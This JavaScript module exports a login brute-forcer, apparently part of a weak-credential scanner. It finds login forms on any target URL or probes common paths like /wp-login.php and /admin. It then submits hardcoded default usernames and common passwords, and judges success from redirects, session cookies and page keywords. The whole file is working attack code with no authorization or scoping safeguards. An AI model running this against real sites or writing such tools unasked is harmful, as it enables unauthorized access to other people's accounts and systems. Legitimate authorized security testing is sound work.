const axios = require("axios");
const cheerio = require("cheerio");

const USERNAMES = [
    "admin", "administrator", "root", "user", "test",
    "guest", "manager", "webmaster", "info", "support"
];

const PASSWORDS = [
    "admin", "password", "123456", "admin123", "test123",
    "root", "toor", "password1", "1234", "12345",
    "123456789", "qwerty", "abc123", "letmein", "welcome",
    "monkey", "master", "dragon", "login", "passw0rd",
    "admin@123", "admin1234", "P@ssw0rd", "pass123", "default"
];

const LOGIN_PATHS = [
    "/login", "/admin", "/admin/login", "/wp-login.php",
    "/user/login", "/signin", "/auth/login", "/account/login",
    "/api/login", "/api/auth/login", "/api/v1/login"
];

const SUCCESS_INDICATORS = [
    "dashboard", "welcome", "logout", "my-account", "profile",
    "session", "token", "authenticated"
];

const FAILURE_INDICATORS = [
    "invalid", "incorrect", "failed", "error", "wrong",
    "denied", "unauthorized", "bad credentials"
];

async function detectLoginForm(url) {
    try {
        const res = await axios.get(url, { timeout: 8000, maxRedirects: 3 });
        const $ = cheerio.load(res.data);
        const forms = [];

        $("form").each((_, form) => {
            const action = $(form).attr("action") || "";
            const method = ($(form).attr("method") || "POST").toUpperCase();
            const inputs = [];

            $(form).find("input").each((_, input) => {
                const name = $(input).attr("name") || "";
                const type = ($(input).attr("type") || "text").toLowerCase();
                if (name) inputs.push({ name, type });
            });

            const userField = inputs.find(i =>
                /user|email|login|name|account/i.test(i.name)
            );
            const passField = inputs.find(i => i.type === "password");

            if (userField && passField) {
                forms.push({ action, method, userField: userField.name, passField: passField.name, inputs });
            }
        });

        return forms;
    } catch {
        return [];
    }
}

function isSuccessResponse(res) {
    const status = res.status;
    const body = typeof res.data === "string" ? res.data.toLowerCase() : JSON.stringify(res.data).toLowerCase();
    const headers = JSON.stringify(res.headers).toLowerCase();

    if (status === 302 || status === 301) return true;
    if (headers.includes("set-cookie") && (headers.includes("session") || headers.includes("token"))) return true;
    if (SUCCESS_INDICATORS.some(ind => body.includes(ind))) return true;
    if (FAILURE_INDICATORS.some(ind => body.includes(ind))) return false;

    return false;
}

async function tryCredential(url, username, password, form) {
    const configs = [];

    if (form) {
        const postData = { [form.userField]: username, [form.passField]: password };
        const actionUrl = form.action
            ? new URL(form.action, url).href
            : url;

        configs.push({
            method: "post",
            url: actionUrl,
            data: new URLSearchParams(postData).toString(),
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
        });
    } else {
        configs.push({
            method: "post",
            url,
            data: { username, password },
            headers: { "Content-Type": "application/json" },
        });

        configs.push({
            method: "post",
            url,
            data: new URLSearchParams({ username, password }).toString(),
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
        });
    }

    for (const config of configs) {
        try {
            const res = await axios({
                ...config,
                timeout: 8000,
                maxRedirects: 0,
                validateStatus: () => true,
            });

            if (isSuccessResponse(res)) {
                return { success: true, username, password, endpoint: config.url };
            }
        } catch {
            continue;
        }
    }

    return { success: false };
}

async function bruteForceLogin(url) {
    const results = {
        loginFormsFound: [],
        testedEndpoints: [],
        weakCredentials: [],
        attempts: 0,
        summary: "No weak credentials detected"
    };

    // Detect login forms on the target
    const forms = await detectLoginForm(url);
    results.loginFormsFound = forms.map(f => ({
        action: f.action || url,
        userField: f.userField,
        passField: f.passField
    }));

    // Build list of endpoints to test
    const endpoints = [];
    if (forms.length > 0) {
        forms.forEach(f => endpoints.push({ url: f.action ? new URL(f.action, url).href : url, form: f }));
    } else {
        for (const loginPath of LOGIN_PATHS) {
            try {
                const testUrl = new URL(loginPath, url).href;
                const probe = await axios.get(testUrl, {
                    timeout: 5000,
                    validateStatus: () => true,
                    maxRedirects: 3
                });
                if (probe.status < 404) {
                    endpoints.push({ url: testUrl, form: null });
                }
            } catch {
                continue;
            }
        }
    }

    results.testedEndpoints = endpoints.map(e => e.url);

    if (endpoints.length === 0) {
        results.summary = "No login endpoints found";
        return results;
    }

    // Test credentials with rate limiting
    for (const ep of endpoints.slice(0, 3)) {
        for (const username of USERNAMES.slice(0, 5)) {
            for (const password of PASSWORDS) {
                results.attempts++;
                const result = await tryCredential(ep.url, username, password, ep.form);

                if (result.success) {
                    results.weakCredentials.push({
                        endpoint: result.endpoint,
                        username: result.username,
                        password: result.password
                    });
                    break; // Move to next username
                }

                // Rate limiting - small delay between attempts
                await new Promise(r => setTimeout(r, 100));
            }
        }
    }

    if (results.weakCredentials.length > 0) {
        results.summary = `Found ${results.weakCredentials.length} weak credential(s)`;
    }

    return results;
}

module.exports = bruteForceLogin;